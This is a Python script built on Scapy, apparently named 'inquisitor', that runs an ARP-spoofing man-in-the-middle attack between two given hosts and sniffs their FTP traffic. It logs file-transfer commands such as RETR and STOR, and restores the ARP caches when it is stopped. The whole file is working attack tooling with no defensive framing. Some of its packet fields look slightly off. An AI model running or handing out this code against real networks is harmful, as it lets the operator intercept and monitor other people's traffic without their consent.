from scapy.all import *
import uuid
import argparse
import ipaddress
import threading
import time
import logging
import re
import signal
import socket

run = True

# ip_src = "10.10.8.2"
# mac_src = "02:42:0a:0a:08:02"

hostname = socket.gethostname()
ip_my = socket.gethostbyname(hostname)

mac_my = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8)[::-1])

# ip_gateway = "10.10.8.4"
# mac_gateway = "02:42:0a:0a:08:04"


def handler_stop_signals(signum, frame):
    global run
    run = False
    stop_event.set()
    log.warning(f"Signal received : {signum}")
    for _ in range(10):
        log.warning(f"Sending to {args.ip_src}, {args.ip_target}, {args.mac_target}")
        log.warning(f"Sending to {args.ip_target}, {args.ip_src}, {args.mac_src}")
        arp_spoof(args.ip_src, args.ip_target, args.mac_target)
        arp_spoof(args.ip_target, args.ip_src, args.mac_src)
        time.sleep(1)
    exit(0)

signal.signal(signal.SIGINT, handler_stop_signals)
signal.signal(signal.SIGTERM, handler_stop_signals)

stop_event = threading.Event()

log = logging.getLogger("inquisitor")
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def arp_spoof(target_ip, gateway_ip, target_mac):
    arp_packet = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=target_mac)
    try:
        send(arp_packet, verbose=False)
    except:
        log.warning("Sending packet not working (probably no permission)")

def threaded_spoofing(ip_server, ip_target, mac_src):
    while not stop_event.is_set():
        arp_spoof(ip_target, ip_server, mac_src)
        arp_spoof(ip_server, ip_target, mac_src)
        time.sleep(1)

def ftp_monitor_callback(packet):
    if packet.haslayer(TCP) and packet[TCP].dport == 21:
        log.warning(f"[{packet.time}] FTP packet captured:")
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors="ignore")
            if "RETR" in payload or "STOR" in payload or "STOU" in payload or "APPE" in payload:
                log.warning(f"{payload}")

def threaded_sniffing():
    try:
        sniff(filter="tcp", prn=ftp_monitor_callback, store=0)
    except:
        log.warning("can't sniff packets (probably no permission)")

def is_valid_mac_address(mac):
    mac_regex = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    res = bool(mac_regex.match(mac))
    if res is False:
        raise Exception("Not a valid mac address")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='This program spoof and can analyze ftp files of a given src')

    parser.add_argument('ip_src')
    parser.add_argument('mac_src')
    parser.add_argument('ip_target')
    parser.add_argument('mac_target')
    
    args = parser.parse_args()

    try:
        ipaddress.IPv4Network(args.ip_src)
        ipaddress.IPv4Network(args.ip_target)
        is_valid_mac_address(args.mac_src)
        is_valid_mac_address(args.mac_target)        
    except:
        print("Not all addresses are valid")
        exit(1)
    log.warning(f"Src_IP : {args.ip_src}, Mac_SRC : {args.mac_src}, Target_IP : {args.ip_target}, Mac_target : {args.mac_target}")

    try:
        spoofing = threading.Thread(target=threaded_spoofing, args=(args.ip_target, args.ip_src, mac_my))
        sniffing = threading.Thread(target=threaded_sniffing)
        spoofing.start()
        sniffing.start()
        spoofing.join()
        sniffing.join()
    except:
        log.warning("Can't create threads, exiting now")
